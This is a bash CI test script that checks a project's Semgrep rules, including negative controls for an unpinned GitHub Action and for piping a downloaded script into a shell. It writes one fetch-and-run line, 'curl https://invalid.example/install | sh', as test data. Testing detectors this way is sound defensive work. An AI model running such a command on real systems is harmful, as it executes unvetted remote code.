#!/usr/bin/env bash
set -euo pipefail

ROOT="$(git rev-parse --show-toplevel)"
TMP="$(mktemp -d "${TMPDIR:-/tmp}/shield-semgrep-test.XXXXXX")"
trap 'rm -rf "$TMP"' EXIT

python3 "$ROOT/ci/tools/semgrep-first-party.py" --output "$TMP/receipt.json"
jq -e '.first_party_target_count > 0 and (.scans | length) == 4' "$TMP/receipt.json" >/dev/null
jq -e 'all(.scans[]; .target_count > 0)' "$TMP/receipt.json" >/dev/null
jq -e 'all(.scans[]; .finding_count == 0)' "$TMP/receipt.json" >/dev/null
jq -e '.scans[] | select(.name == "c-security-parser-limited") | .parse_error_count > 0' \
    "$TMP/receipt.json" >/dev/null
jq -e '(.c_generic_only | length) > 0' "$TMP/receipt.json" >/dev/null
jq -e 'any(.scans[0].targets[]; . == "contrib/check-deployment")' "$TMP/receipt.json" >/dev/null

printf '%s\n' 'curl https://invalid.example/install | sh' >"$TMP/unsafe.sh"
if semgrep scan --config "$ROOT/ci/semgrep/first-party.yml" --error --json \
    --metrics=off --scan-unknown-extensions "$TMP/unsafe.sh" \
    >"$TMP/unsafe.json" 2>"$TMP/unsafe.stderr"; then
    echo 'first-party Semgrep negative control did not fire' >&2
    exit 1
fi
jq -e '(.errors | length) == 0 and any(.results[]; .check_id | endswith("first-party-curl-pipe-shell"))' \
    "$TMP/unsafe.json" >/dev/null
python3 - "$ROOT" "$TMP/unsafe.sh" <<'PY'
import importlib.util
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
spec = importlib.util.spec_from_file_location(
    "semgrep_first_party", root / "ci/tools/semgrep-first-party.py"
)
module = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(module)
scan = module.run_semgrep(
    "negative-control", [str(root / "ci/semgrep/first-party.yml")], [sys.argv[2]]
)
assert scan["finding_count"] == 1
assert scan["findings"][0]["check_id"].endswith("first-party-curl-pipe-shell")
assert scan["findings"][0]["message"]

try:
    module.validate_c_partition([*module.C_AST_TARGETS, "src/new.c"])
except ValueError as exc:
    message = str(exc)
    assert "unclassified=['src/new.c']" in message, message
    assert "stale=" in message, message
else:
    raise AssertionError("unclassified C source unexpectedly passed accounting")
PY

mkdir -p "$TMP/.github/workflows"
printf '%s\n' 'jobs: {test: {steps: [{uses: "owner/action@v1"}]}}' \
    >"$TMP/.github/workflows/quoted.yml"
if (cd "$TMP" && semgrep scan --config "$ROOT/ci/semgrep/first-party.yml" --error --json \
    --metrics=off .github/workflows/quoted.yml >"$TMP/quoted.json" 2>/dev/null); then
    echo 'quoted unpinned-action control did not fire' >&2
    exit 1
fi
jq -e '(.errors | length) == 0 and any(.results[]; .check_id | endswith("first-party-unpinned-action"))' \
    "$TMP/quoted.json" >/dev/null

printf '%s\n' 'curl -fsS -o archive.tar.gz https://invalid.example/archive.tar.gz' >"$TMP/safe.sh"
semgrep scan --config "$ROOT/ci/semgrep/first-party.yml" --error \
    --metrics=off --scan-unknown-extensions "$TMP/safe.sh" >/dev/null

echo 'first-party Semgrep controls: ok'
